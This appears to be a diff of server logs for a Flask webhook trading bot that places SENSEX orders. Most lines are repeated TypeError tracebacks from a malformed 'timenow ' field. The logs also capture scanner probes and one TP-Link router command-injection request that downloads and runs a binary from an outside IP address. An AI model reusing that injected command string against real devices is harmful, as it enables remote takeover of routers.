@@ -1,34 +1,40 @@
-[2024-05-24 05:41:46 +0000] [1986] [INFO] Starting gunicorn 22.0.0
-[2024-05-24 05:41:46 +0000] [1986] [INFO] Listening at: http://0.0.0.0:5001 (1986)
-[2024-05-24 05:41:46 +0000] [1986] [INFO] Using worker: sync
-[2024-05-24 05:41:46 +0000] [1987] [INFO] Booting worker with pid: 1987
-[2024-05-24 05:41:46 +0000] [1988] [INFO] Booting worker with pid: 1988
-[2024-05-24 05:41:46 +0000] [1989] [INFO] Booting worker with pid: 1989
-[2024-05-24 05:42:28 +0000] [1986] [INFO] Handling signal: int
-[2024-05-24 05:42:29 +0000] [1987] [INFO] Worker exiting (pid: 1987)
-[2024-05-24 05:42:29 +0000] [1988] [INFO] Worker exiting (pid: 1988)
-[2024-05-24 05:42:29 +0000] [1989] [INFO] Worker exiting (pid: 1989)
-[2024-05-24 05:42:29 +0000] [1986] [INFO] Shutting down: Master
-[2024-05-24 05:43:01 +0000] [1996] [INFO] Starting gunicorn 22.0.0
-[2024-05-24 05:43:01 +0000] [1996] [INFO] Listening at: http://0.0.0.0:5001 (1996)
-[2024-05-24 05:43:01 +0000] [1996] [INFO] Using worker: sync
-[2024-05-24 05:43:01 +0000] [1997] [INFO] Booting worker with pid: 1997
-[2024-05-24 05:43:01 +0000] [1998] [INFO] Booting worker with pid: 1998
-[2024-05-24 05:43:01 +0000] [1999] [INFO] Booting worker with pid: 1999
-[2024-05-24 05:53:01 +0000] [2475] [INFO] Starting gunicorn 22.0.0
-[2024-05-24 05:53:01 +0000] [2475] [ERROR] Retrying in 1 second.
-[2024-05-24 05:53:02 +0000] [2475] [ERROR] Retrying in 1 second.
-[2024-05-24 05:53:03 +0000] [2475] [ERROR] Retrying in 1 second.
-[2024-05-24 05:53:04 +0000] [2475] [ERROR] Retrying in 1 second.
-[2024-05-24 05:53:05 +0000] [2475] [ERROR] Retrying in 1 second.
-[2024-05-24 05:53:06 +0000] [2475] [ERROR] Can't connect to ('0.0.0.0', 80)
-[2024-05-24 05:57:15 +0000] [2482] [INFO] Starting gunicorn 22.0.0
-[2024-05-24 05:57:15 +0000] [2482] [INFO] Listening at: http://0.0.0.0:80 (2482)
-[2024-05-24 05:57:15 +0000] [2482] [INFO] Using worker: sync
-[2024-05-24 05:57:15 +0000] [2483] [INFO] Booting worker with pid: 2483
-[2024-05-24 05:57:15 +0000] [2484] [INFO] Booting worker with pid: 2484
-[2024-05-24 05:57:15 +0000] [2485] [INFO] Booting worker with pid: 2485
-[2024-05-24 05:59:44,071] ERROR in app: Exception on /webhook [POST]
+[I 240610 21:35:57 smartConnect:121] in pool
+ * Serving Flask app 'main'
+ * Debug mode: off
+2024-06-10 21:36:04,484 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2024-06-10 21:36:04,484 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2024-06-10 22:41:44,420 - werkzeug - INFO - 127.0.0.1 - - [10/Jun/2024 22:41:44] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-10 22:41:45,534 - werkzeug - INFO - 127.0.0.1 - - [10/Jun/2024 22:41:45] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-10 22:48:40,560 - werkzeug - INFO - 127.0.0.1 - - [10/Jun/2024 22:48:40] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-10 23:13:57,462 - werkzeug - INFO - 127.0.0.1 - - [10/Jun/2024 23:13:57] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-10 23:13:57,701 - werkzeug - INFO - 127.0.0.1 - - [10/Jun/2024 23:13:57] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 01:00:15,706 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:00:15] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 01:00:54,706 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:00:54] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.0[0m" 404 -
+2024-06-11 01:01:41,055 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:01:41] "[33mGET /webui/ HTTP/1.0[0m" 404 -
+2024-06-11 01:03:48,229 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:03:48] "[33mGET /geoserver/web/ HTTP/1.0[0m" 404 -
+2024-06-11 01:09:54,992 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:09:54] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 01:09:55,070 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:09:55] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 01:22:08,989 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:22:08] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 01:44:27,837 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 01:44:27] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 02:01:18,267 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 02:01:18] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 02:41:58,122 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 02:41:58] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 02:50:14,184 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 02:50:14] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+r;+wget+http://94.156.71.81/r;+chmod+777+r;+./r+tplink;+rm+-rf+r`) HTTP/1.0[0m" 404 -
+2024-06-11 03:02:41,960 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 03:02:41] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 03:02:42,036 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 03:02:42] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 03:09:53,041 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 03:09:53] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.0[0m" 404 -
+2024-06-11 03:40:49,956 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 03:40:49] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 03:40:50,203 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 03:40:50] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 04:40:03,135 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T04:40:00Z",\n    "strategy.order.price": "76626.62",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 04:40:03,136 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T04:40:00Z', 'strategy.order.price': '76626.62', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+[I 240611 04:40:04 smart_api_client:77] OrderId: 240611000428774
+[I 240611 04:40:05 smart_api_client:85] Logout Successful
+2024-06-11 04:40:05,447 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 04:40:05] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 04:52:43,657 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 04:52:43] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 04:52:43,734 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 04:52:43] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 05:14:31,454 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:14:30Z",\n    "strategy.order.price": "76675.87",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:14:31,454 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:14:30Z', 'strategy.order.price': '76675.87', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:14:31,454 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -42,13 +48,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 75, in webhook
-    update_trade(ticker, actual_price, timenow_ist)
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 40, in update_trade
-    with open(CSV_FILE, 'r') as file:
-         ^^^^^^^^^^^^^^^^^^^
-FileNotFoundError: [Errno 2] No such file or directory: 'trades.csv'
-[2024-05-24 06:00:08,663] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:14:31,455 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:14:31] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:14:36,774 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:14:30Z",\n    "strategy.order.price": "76675.87",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:14:36,775 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:14:30Z', 'strategy.order.price': '76675.87', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:14:36,775 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -62,13 +72,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 75, in webhook
-    update_trade(ticker, actual_price, timenow_ist)
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 40, in update_trade
-    with open(CSV_FILE, 'r') as file:
-         ^^^^^^^^^^^^^^^^^^^
-FileNotFoundError: [Errno 2] No such file or directory: 'trades.csv'
-[2024-05-24 06:00:14,084] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:14:36,776 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:14:36] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:14:42,096 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:14:30Z",\n    "strategy.order.price": "76675.87",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:14:42,097 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:14:30Z', 'strategy.order.price': '76675.87', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:14:42,097 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -82,13 +96,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 75, in webhook
-    update_trade(ticker, actual_price, timenow_ist)
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 40, in update_trade
-    with open(CSV_FILE, 'r') as file:
-         ^^^^^^^^^^^^^^^^^^^
-FileNotFoundError: [Errno 2] No such file or directory: 'trades.csv'
-[2024-05-24 06:00:21,512] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:14:42,097 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:14:42] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:14:47,418 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:14:30Z",\n    "strategy.order.price": "76675.87",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:14:47,418 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:14:30Z', 'strategy.order.price': '76675.87', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:14:47,419 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -102,13 +120,28 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 75, in webhook
-    update_trade(ticker, actual_price, timenow_ist)
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 40, in update_trade
-    with open(CSV_FILE, 'r') as file:
-         ^^^^^^^^^^^^^^^^^^^
-FileNotFoundError: [Errno 2] No such file or directory: 'trades.csv'
-[2024-05-24 06:00:26,902] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:14:47,420 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:14:47] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:18:24,161 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:24] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 05:18:24,913 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:24] "[33mGET /form.html HTTP/1.0[0m" 404 -
+2024-06-11 05:18:25,638 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:25] "[33mGET /upl.php HTTP/1.0[0m" 404 -
+2024-06-11 05:18:27,095 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:27] "[33mGET /geoip/ HTTP/1.0[0m" 404 -
+2024-06-11 05:18:27,849 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:27] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2024-06-11 05:18:28,583 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:28] "[33mGET /1.php HTTP/1.0[0m" 404 -
+2024-06-11 05:18:29,325 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:29] "[33mGET /bundle.js HTTP/1.0[0m" 404 -
+2024-06-11 05:18:30,060 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:30] "[33mGET /files/ HTTP/1.0[0m" 404 -
+2024-06-11 05:18:30,802 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:30] "[33mGET /systembc/password.php HTTP/1.0[0m" 404 -
+2024-06-11 05:18:31,521 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:31] "[33mGET /password.php HTTP/1.0[0m" 404 -
+2024-06-11 05:18:32,306 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:18:32] "[33mGET /info.php HTTP/1.0[0m" 404 -
+2024-06-11 05:23:31,481 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:23:30Z",\n    "strategy.order.price": "76688.88",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 05:23:31,481 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:23:30Z', 'strategy.order.price': '76688.88', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 05:23:31,482 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -122,21 +155,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 75, in webhook
-    update_trade(ticker, actual_price, timenow_ist)
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 40, in update_trade
-    with open(CSV_FILE, 'r') as file:
-         ^^^^^^^^^^^^^^^^^^^
-FileNotFoundError: [Errno 2] No such file or directory: 'trades.csv'
-[2024-05-24 06:02:30 +0000] [2482] [INFO] Handling signal: hup
-[2024-05-24 06:02:30 +0000] [2482] [INFO] Hang up: Master
-[2024-05-24 06:02:30 +0000] [2482] [ERROR] Worker (pid:2484) was sent SIGHUP!
-[2024-05-24 06:02:30 +0000] [2482] [ERROR] Worker (pid:2483) was sent SIGHUP!
-[2024-05-24 06:02:30 +0000] [2482] [ERROR] Worker (pid:2485) was sent SIGHUP!
-[2024-05-24 06:02:30 +0000] [2521] [INFO] Booting worker with pid: 2521
-[2024-05-24 06:02:30 +0000] [2522] [INFO] Booting worker with pid: 2522
-[2024-05-24 06:02:30 +0000] [2523] [INFO] Booting worker with pid: 2523
-[2024-05-24 06:06:01,648] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:23:31,482 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:23:31] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:23:36,818 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:23:30Z",\n    "strategy.order.price": "76688.88",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 05:23:36,818 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:23:30Z', 'strategy.order.price': '76688.88', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 05:23:36,819 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -150,11 +179,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:06:07,303] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:23:36,819 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:23:36] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:23:42,136 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:23:30Z",\n    "strategy.order.price": "76688.88",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 05:23:42,136 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:23:30Z', 'strategy.order.price': '76688.88', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 05:23:42,136 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -168,11 +203,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:06:12,620] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:23:42,137 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:23:42] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:23:47,455 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:23:30Z",\n    "strategy.order.price": "76688.88",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 05:23:47,456 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:23:30Z', 'strategy.order.price': '76688.88', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 05:23:47,456 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -186,11 +227,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:06:17,956] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:23:47,458 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:23:47] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:27:00,870 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:27:00Z",\n    "strategy.order.price": "76682.64",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:27:00,870 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:27:00Z', 'strategy.order.price': '76682.64', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:27:00,870 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -204,56 +251,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
